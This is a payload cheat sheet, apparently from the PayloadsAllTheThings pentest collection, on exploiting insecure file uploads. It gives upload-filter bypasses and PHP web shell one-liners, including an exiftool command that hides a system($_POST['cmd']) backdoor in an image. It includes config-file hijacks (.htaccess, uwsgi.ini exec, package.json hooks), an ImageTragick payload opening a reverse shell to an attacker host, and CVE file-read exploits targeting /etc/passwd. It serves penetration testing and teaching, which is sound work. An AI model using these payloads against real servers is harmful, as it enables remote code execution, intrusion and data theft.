# upload insecure files

> uploaded files may pose a significant risk if not handled correctly. a remote attacker could send a multipart/form-data post request with a specially-crafted filename or mime type and execute arbitrary code.

## summary

* [tools](#tools)
* [methodology](#methodology)
    * [defaults extensions](#defaults-extensions)
    * [upload tricks](#upload-tricks)
    * [filename vulnerabilities](#filename-vulnerabilities)
    * [picture compression](#picture-compression)
    * [picture metadata](#picture-metadata)
    * [configuration files](#configuration-files)
    * [cve - imagemagick](#cve---imagemagick)
    * [cve - ffmpeg hls](#cve---ffmpeg-hls)
* [labs](#labs)
* [references](#references)

## tools

* [almandin/fuxploiderfuxploider](https://github.com/almandin/fuxploider) - file upload vulnerability scanner and exploitation tool.
* [burp/upload scanner](https://portswigger.net/bappstore/b2244cbb6953442cb3c82fa0a0d908fa) -  http file upload scanner for burp proxy.
* [zap/fileupload](https://www.zaproxy.org/blog/2021-08-20-zap-fileupload-addon/) -  owasp zap add-on for finding vulnerabilities in file upload functionality.

## methodology


[image extracted text: [image not found]]


### defaults extensions

here is a list of the default extensions for web shell pages in the selected languages (php, asp, jsp).

* php server

    ```powershell
    .php
    .php3
    .php4
    .php5
    .php7

    # less known php extensions
    .pht
    .phps
    .phar
    .phpt
    .pgif
    .phtml
    .phtm
    .inc
    ```

* asp server

    ```powershell
    .asp
    .aspx
    .config
    .cer and .asa # (iis <= 7.5)
    shell.aspx;1.jpg # (iis < 7.0)
    shell.soap
    ```

* jsp : `.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .actions`
* perl: `.pl, .pm, .cgi, .lib`
* coldfusion: `.cfm, .cfml, .cfc, .dbm`
* node.js: `.js, .json, .node`

other extensions that can be abused to trigger other vulnerabilities.

* `.svg`: xxe, xss, ssrf
* `.gif`: xss
* `.csv`: csv injection
* `.xml`: xxe
* `.avi`: lfi, ssrf
* `.js` : xss, open redirect
* `.zip`: rce, dos, lfi gadget
* `.html` : xss, open redirect

### upload tricks

**extensions**:

* use double extensions : `.jpg.php, .png.php5`
* use reverse double extension (useful to exploit apache misconfigurations where anything with extension .php, but not necessarily ending in .php will execute code): `.php.jpg`
* random uppercase and lowercase : `.php, .php5, .phar`
* null byte (works well against `pathinfo()`)
    * `.php%00.gif`
    * `.php\x00.gif`
    * `.php%00.png`
    * `.php\x00.png`
    * `.php%00.jpg`
    * `.php\x00.jpg`
* special characters
    * multiple dots : `file.php......` , in windows when a file is created with dots at the end those will be removed.
    * whitespace and new line characters
        * `file.php%20`
        * `file.php%0d%0a.jpg`
        * `file.php%0a`
    * right to left override (rtlo): `name.%e2%80%aephp.jpg` will became `name.gpj.php`.
    * slash: `file.php/`, `file.php.\`, `file.j\sp`, `file.j/sp`
    * multiple special characters: `file.jsp/././././.`

**file identification**:

mime type, a mime type (multipurpose internet mail extensions type) is a standardized identifier that tells browsers, servers, and applications what kind of file or data is being handled. it consists of a type and a subtype, separated by a slash. change `content-type : application/x-php` or `content-type : application/octet-stream` to `content-type : image/gif` to disguise the content as an image.

* common images content-types:

    ```cs
    content-type: image/gif
    content-type: image/png
    content-type: image/jpeg
    ```

* content-type wordlist: [seclists/web-all-content-types.txt](https://github.com/danielmiessler/seclists/blob/master/discovery/web-content/web-all-content-types.txt)

    ```cs
    text/php
    text/x-php
    application/php
    application/x-php
    application/x-httpd-php
    application/x-httpd-php-source
    ```

* set the `content-type` twice, once for unallowed type and once for allowed.

[magic bytes](https://en.wikipedia.org/wiki/list_of_file_signatures) - sometimes applications identify file types based on their first signature bytes. adding/replacing them in a file might trick the application.

* png: `\x89png\r\n\x1a\n\0\0\0\rihdr\0\0\x03h\0\xs0\x03[`
* jpg: `\xff\xd8\xff`
* gif: `gif87a` or `gif8;`

**file encapsulation**:

using ntfs alternate data stream (ads) in windows.
in this case, a colon character ":" will be inserted after a forbidden extension and before a permitted one. as a result, an empty file with the forbidden extension will be created on the server (e.g. "`file.asax:.jpg`"). this file might be edited later using other techniques such as using its short filename. the "::$data" pattern can also be used to create non-empty files. therefore, adding a dot character after this pattern might also be useful to bypass further restrictions (.e.g. "`file.asp::$data.`")

**other techniques**:

php web shells don't always have the `<?php` tag, here are some alternatives:

* using a php script tag `<script language="php">`

    ```html
    <script language="php">system("id");</script>
    ```

* the `<?=` is shorthand syntax in php for outputting values. it is equivalent to using `<?php echo`.

    ```php
    <?=`$_get[0]`?>
    ```

### filename vulnerabilities

sometimes the vulnerability is not the upload but how the file is handled after. you might want to upload files with payloads in the filename.

* time-based sqli payloads: e.g. `poc.js'(select*from(select(sleep(20)))a)+'.extension`
* lfi/path traversal payloads:  e.g. `image.png../../../../../../../etc/passwd`
* xss payloads e.g. `'"><img src=x onerror=alert(document.domain)>.extension`
* file traversal e.g. `../../../tmp/lol.png`
* command injection e.g. `; sleep 10;`

also you upload:

* html/svg files to trigger an xss
* eicar file to check the presence of an antivirus

### picture compression

create valid pictures hosting php code. upload the picture and use a **local file inclusion** to execute the code. the shell can be called with the following command : `curl 'http://localhost/test.php?0=system' --data "1='ls'"`.

* picture metadata, hide the payload inside a comment tag in the metadata.
* picture resize, hide the payload within the compression algorithm in order to bypass a resize. also defeating `getimagesize()` and `imagecreatefromgif()`.
    * [jpg](https://virtualabs.fr/nasty-bulletproof-jpegs-l): use createbulletproofjpg.py
    * [png](https://blog.isec.pl/injection-points-in-popular-image-formats/): use createpngwithplte.php
    * [gif](https://blog.isec.pl/injection-points-in-popular-image-formats/): use creategifwithglobalcolortable.php

### picture metadata

create a custom picture and insert exif tag with `exiftool`. a list of multiple exif tags can be found at [exiv2.org](https://exiv2.org/tags.html)

```ps1
convert -size 110x110 xc:white payload.jpg
exiftool -copyright="payloadsallthethings" -artist="pentest" -imageuniqueid="example" payload.jpg
exiftool -comment="<?php echo 'command:'; if($_post){system($_post['cmd']);} __halt_compiler();" img.jpg
```

### configuration files

if you are trying to upload files to a :

* php server, take a look at the [.htaccess](https://github.com/swisskyrepo/payloadsallthethings/tree/master/upload%20insecure%20files/configuration%20apache%20.htaccess) trick to execute code.
* asp server, take a look at the [web.config](https://github.com/swisskyrepo/payloadsallthethings/tree/master/upload%20insecure%20files/configuration%20iis%20web.config) trick to execute code.
* uwsgi server, take a look at the [uwsgi.ini](https://github.com/swisskyrepo/payloadsallthethings/tree/master/upload%20insecure%20files/configuration%20uwsgi.ini/uwsgi.ini) trick to execute code.

configuration files examples

* [apache: .htaccess](https://github.com/swisskyrepo/payloadsallthethings/tree/master/upload%20insecure%20files/configuration%20apache%20.htaccess)
* [iis: web.config](https://github.com/swisskyrepo/payloadsallthethings/tree/master/upload%20insecure%20files/configuration%20iis%20web.config)
* [python: \_\_init\_\_.py](https://github.com/swisskyrepo/payloadsallthethings/tree/master/upload%20insecure%20files/configuration%20python%20__init__.py)
* [wsgi: uwsgi.ini](https://github.com/swisskyrepo/payloadsallthethings/tree/master/upload%20insecure%20files/configuration%20uwsgi.ini/uwsgi.ini)

#### apache: .htaccess

the `addtype` directive in an `.htaccess` file is used to specify the mime (multipurpose internet mail extensions) type for different file extensions on an apache http server. this directive helps the server understand how to handle different types of files and what content type to associate with them when serving them to clients (such as web browsers).  

here is the basic syntax of the addtype directive:

```ps1
addtype mime-type extension [extension ...]
```

exploit `addtype` directive by uploading an .htaccess file with the following content.

```ps1
addtype application/x-httpd-php .rce
```

then upload any file with `.rce` extension.

#### wsgi: uwsgi.ini

uwsgi configuration files can include “magic” variables, placeholders and operators defined with a precise syntax. the ‘@’ operator in particular is used in the form of @(filename) to include the contents of a file. many uwsgi schemes are supported, including “exec” - useful to read from a process’s standard output. these operators can be weaponized for remote command execution or arbitrary file write/read when a .ini configuration file is parsed:

example of a malicious `uwsgi.ini` file:

```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[redacted])
; read from http
test = @(http://[redacted])
; read from a file descriptor
content = @(fd://[redacted])
; read from a process stdout
body = @(exec://whoami)
; call a function returning a char *
characters = @(call://uwsgi_func)
```

when the configuration file will be parsed (e.g. restart, crash or autoreload) payload will be executed.

#### dependency manager

alternatively you may be able to upload a json file with a custom scripts, try to overwrite a dependency manager configuration file.

* package.json

    ```js
    "scripts": {
        "prepare" : "/bin/touch /tmp/pwned.txt"
    }
    ```

* composer.json

    ```js
    "scripts": {
        "pre-command-run" : [
        "/bin/touch /tmp/pwned.txt"
        ]
    }
    ```

### cve - imagemagick

if the backend is using imagemagick to resize/convert user images, you can try to exploit well-known vulnerabilities such as imagetragik.

#### cve-2016–3714 - imagetragik

upload this content with an image extension to exploit the vulnerability (imagemagick , 7.0.1-1)

* imagetragik - example #1

    ```powershell
    push graphic-context
    viewbox 0 0 640 480
    fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
    pop graphic-context
    ```

* imagetragik - example #3

    ```powershell
    %!ps
    userdict /setpagedevice undef
    save
    legal
    { null restore } stopped { pop } if
    { legal } stopped { pop } if
    restore
    mark /outputfile (%pipe%id) currentdevice putdeviceprops
    ```

the vulnerability can be triggered by using the `convert` command.

```ps1
convert shellexec.jpeg whatever.gif
```

#### cve-2022-44268

cve-2022-44268 is an information disclosure vulnerability identified in imagemagick. an attacker can exploit this by crafting a malicious image file that, when processed by imagemagick, can disclose information from the local filesystem of the server running the vulnerable version of the software.

* generate the payload

    ```ps1
    apt-get install pngcrush imagemagick exiftool exiv2 -y
    pngcrush -text a "profile" "/etc/passwd" exploit.png
    ```

* trigger the exploit by uploading the file. the backend might use something like `convert pngout.png pngconverted.png`
* download the converted picture and inspect its content with: `identify -verbose pngconverted.png`
* convert the exfiltrated data: `python3 -c 'print(bytes.fromhex("hex_from_file").decode("utf-8"))'`

more payloads in the folder `picture imagemagick/`.

### cve - ffmpeg hls

ffmpeg is an open source software used for processing audio and video formats. you can use a malicious hls playlist inside an avi video to read arbitrary files.

1. `./gen_xbin_avi.py file://<filename> file_read.avi`
2. upload `file_read.avi` to some website that processes videofiles
3. on server side, done by the videoservice: `ffmpeg -i file_read.avi output.mp4`
4. click "play" in the videoservice.
5. if you are lucky, you'll the content of `<filename>` from the server.

the script creates an avi that contains an hls playlist inside gab2. the playlist generated by this script looks like this:

```ps1
#extm3u
#ext-x-media-sequence:0
#extinf:1.0
god.txt
#extinf:1.0
/etc/passwd
#ext-x-endlist
```

more payloads in the folder `cve ffmpeg hls/`.

## labs

* [portswigger - labs on file uploads](https://portswigger.net/web-security/all-labs#file-upload-vulnerabilities)
* [root me - file upload - double extensions](https://www.root-me.org/en/challenges/web-server/file-upload-double-extensions)
* [root me - file upload - mime type](https://www.root-me.org/en/challenges/web-server/file-upload-mime-type)
* [root me - file upload - null byte](https://www.root-me.org/en/challenges/web-server/file-upload-null-byte)
* [root me - file upload - zip](https://www.root-me.org/en/challenges/web-server/file-upload-zip)
* [root me - file upload - polyglot](https://www.root-me.org/en/challenges/web-server/file-upload-polyglot)

## references

* [a new vector for “dirty” arbitrary file write to rce - doyensec - maxence schmitt and lorenzo stella - 28 feb 2023](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
* [arbitrary file upload tricks in java - pyn3rd - 2022-05-07](https://pyn3rd.github.io/2022/05/07/arbitrary-file-upload-tricks-in-java/)
* [attacking webservers via .htaccess - eldar marcussen - may 17, 2011](http://www.justanotherhacker.com/2011/05/htaccess-based-attacks.html)
* [bookfresh tricky file upload bypass to rce - ahmed aboul-ela - november 29, 2014](http://web.archive.org/web/20141231210005/https://secgeek.net/bookfresh-vulnerability/)
* [bulletproof jpegs generator - damien cauquil (@virtualabs) - april 9, 2012](https://virtualabs.fr/nasty-bulletproof-jpegs-l)
* [encoding web shells in png idat chunks - phil - 04-06-2012](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
* [file upload - hacktricks - 20/7/2024](https://book.hacktricks.xyz/pentesting-web/file-upload)
* [file upload restrictions bypass - haboob team - july 24, 2018](https://www.exploit-db.com/docs/english/45074-file-upload-restrictions-bypass.pdf)
* [iis - soap - navigating the shadows - 0xbad53c - 19/5/2024](https://red.0xbad53c.com/red-team-operations/initial-access/webshells/iis-soap)
* [injection points in popular image formats - daniel kalinowski‌‌ - nov 8, 2019](https://blog.isec.pl/injection-points-in-popular-image-formats/)
* [insomnihack teaser 2019 / l33t-hoster - ian bouchard (@corb3nik) - january 20, 2019](http://corb3nik.github.io/blog/insomnihack-teaser-2019/l33t-hoster)
* [inyección de código en imágenes subidas y tratadas con php-gd - hackplayers - march 22, 2020](https://www.hackplayers.com/2020/03/inyeccion-de-codigo-en-imagenes-php-gd.html)
* [la png qui se prenait pour du php - philippe paget (@pagetphil) - february, 23 2014](https://phil242.wordpress.com/2014/02/23/la-png-qui-se-prenait-pour-du-php/)
* [more ghostscript issues: should we disable ps coders in policy.xml by default? - tavis ormandy - 21 aug 2018](http://openwall.com/lists/oss-security/2018/08/21/2)
* [phdays - attacks on video converters:a year later - emil lerner, pavel cheremushkin - december 20, 2017](https://docs.google.com/presentation/d/1yqwy_ae3dqnxahw8kxmxrqtp7qmhaifmzudpeqfneos/edit#slide=id.p)
* [protection from unrestricted file upload vulnerability - narendra shinde - october 22, 2015](https://blog.qualys.com/securitylabs/2015/10/22/unrestricted-file-upload-vulnerability)
* [the .phpt file structure - php internals book - october 18, 2017](https://www.phpinternalsbook.com/tests/phpt_file_structure.html)
